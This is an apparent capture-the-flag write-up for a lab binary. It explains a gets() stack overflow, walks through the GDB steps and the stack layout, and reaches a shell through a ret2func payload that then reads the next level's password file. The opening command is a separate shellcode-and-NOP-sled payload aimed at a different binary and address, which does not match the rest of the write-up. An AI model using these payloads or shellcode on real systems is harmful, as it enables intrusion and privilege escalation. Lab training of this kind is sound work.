command: (python -c 'print "\x90"*40 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*19 + "\xcf\x84\x04\x08"'; cat) | ./level2

=== Analysis ===

1. Ran "info functions" in GDB and found a suspicious
   function called "run" at address 0x08048444 that
   is never called by main.

2. Disassembled run() and found:
   - calls fwrite() → prints "Good... Wait what?"
   - calls system("/bin/sh") → opens a shell as level2

3. Disassembled main() and found:
   - sub $0x50,%esp → allocates 80 bytes on stack
   - lea 0x10(%esp),%eax → buffer starts 16 bytes from esp
   - calls gets() → no size limit → buffer overflow vulnerability
   - actual buffer size: 0x50 - 0x10 = 0x40 = 64 bytes

=== Stack Layout ===


High addresses
┌─────────────────────┐
│ return address      │  4 bytes
├─────────────────────┤
│ saved EBP           │  4 bytes
├─────────────────────┤
│ 8 bytes (padding)   │  ← The compiler needed the total frame to be 88 bytes for alignment. (ebp - esp to calculate)
├─────────────────────┤
│                     │
|  buffer (64 bytes)  │
│                     │
├─────────────────────┤
│ 16 bytes (padding)  │  ← below buffer offset padding;
└─────────────────────┘
Low addresses  ← esp points here, stack grows this way (top of the stack)  

-------------------------------------------------------------
ps : ESP = 0xbffff6d0 points to the top of the stack        |
That address is low compared to the data above it           |
“Top” does NOT mean “highest address”                       |
                                                            |
-> Stack growth (allocation)                                |
                                                            |
This happens when the program reserves space for locals:    |
Stack grows downward → allocation phase                     |
Buffer writes go upward → data writing phase                |
                                                            |
They are independent directions                             |
                                                            |
New buffer space is created below                           |
EBP and return address don’t move                           |
They stay at higher addresses                               |
-------------------------------------------------------------

=== Exploit Calculation ===

To reach return address:
- 72 bytes → fill buffer and space up to EBP
-  4 bytes → overwrite saved EBP
= 76 bytes before return address

=== Address ===

run() address:       0x08048444
Little endian:       \x44\x84\x04\x08
(x86 stores addresses with least significant byte first)

=== Payload ===

(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1

- "A" * 76  → fills buffer + EBP (76 bytes of junk)
- \x44\x84\x04\x08 → address of run() in little endian
- cat → keeps stdin open so shell stays interactive

=== Result ===

Program jumps to run() → calls system("/bin/sh")
→ interactive shell as level2
→ cat /home/user/level2/.pass → [password]

=== Note ===

Shellcode injection is also a valid solution here
since NX is disabled for this binary.
ret2func was chosen for simplicity.





=================================== steps to verify calculation ================================

Step 1 — set breakpoint BEFORE running:
bash(gdb) break main
You should see:
Breakpoint 1 at 0x08048483

Step 2 — now run:
bash(gdb) run
Program will STOP at main — you'll see:
Breakpoint 1, 0x08048483 in main ()

step3: 
ni
ni
ni
ni
ni (reach gets function) -> fill with some content

Step 4 — now check registers:
bash(gdb) info registers esp ebp

Step 4 — view stack memory:
bash(gdb) x/80x $esp
